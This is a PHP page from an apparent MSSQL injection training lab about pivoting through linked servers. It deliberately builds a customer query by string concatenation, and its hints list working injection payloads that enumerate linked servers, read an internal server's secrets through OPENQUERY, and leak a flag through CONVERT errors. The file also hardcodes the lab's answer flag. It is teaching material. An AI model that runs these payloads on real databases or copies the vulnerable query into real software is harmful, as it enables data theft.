<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab13_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab13", $mode));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        // Simulation fallback
        if ($submitted === 'FLAG{ms_l1nk3d_s3rv3r_p1v0t}') {
            $_SESSION['mssql_lab13_solved'] = true;
            header("Location: " . url_lab_from_slug("mssql/lab13", $mode));
            exit;
        } else {
            $verify_error = "Incorrect. Keep trying!";
        }
    }
}
?>
<?php if (!empty($driver_missing)): ?>
<div class="result-warning result-box" style="margin-bottom:16px;">
    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
    Query construction shown for learning. Install the driver for live execution.
</div>
<?php endif; ?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 13. Linked Servers: Pivoting</h3>

    <h4>Scenario</h4>
    <p>
        An enterprise application connects to <strong>Server A</strong> (the web database).
        Server A has a <strong>linked server</strong> (<code>INTERNAL_DB_SRV</code>) configured
        to <strong>Server B</strong> (an internal database with sensitive data including secrets,
        user accounts, and salary records). The linked server connection uses sysadmin credentials
        on Server B.
    </p>
    <p>
        Using <code>OPENQUERY()</code> or four-part naming (<code>[SERVER].[DB].[SCHEMA].[TABLE]</code>),
        you can pivot from Server A to query Server B through the linked server connection.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the flag from the local <code>flags</code> table, then pivot to the linked
        server and exfiltrate sensitive data from the internal database. Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Enumerate linked servers: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.servers WHERE is_linked=1)) -- -</code><br>
        2. Query linked server: <code>' UNION SELECT * FROM OPENQUERY(LINKED_SRV, 'SELECT TOP 1 secret FROM internal_db.dbo.secrets') -- -</code><br>
        3. Four-part name: <code>' UNION SELECT TOP 1 secret, NULL, NULL FROM [LINKED_SRV].[internal_db].[dbo].[secrets] -- -</code><br>
        4. Local flag: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab13_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You extracted the flag and learned about MSSQL linked server pivoting.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Customer Lookup</h4>
    <form method="POST" class="form-row">
<input type="text" name="name" class="input" placeholder="Customer name (try: John)" value="<?= htmlspecialchars($_POST['name'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['name'])) {
    $name = $_POST['name'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, name, email FROM customers WHERE name LIKE '%$name%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    if ($conn) {
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (empty($rows)) {
                echo '<div class="result-warning result-box">No customers found.</div>';
            } else {
                foreach ($rows as $row) {
                    echo '<div class="result-data result-box">';
                    echo '<strong>' . htmlspecialchars($row['name'] ?? '') . '</strong>';
                    echo ' &nbsp;&bull;&nbsp; ' . htmlspecialchars($row['email'] ?? '');
                    echo '</div>';
                }
            }
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-warning result-box">';
        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the driver for live results.';
        echo '</div>';
    }
}
?>

<?php endif; ?>
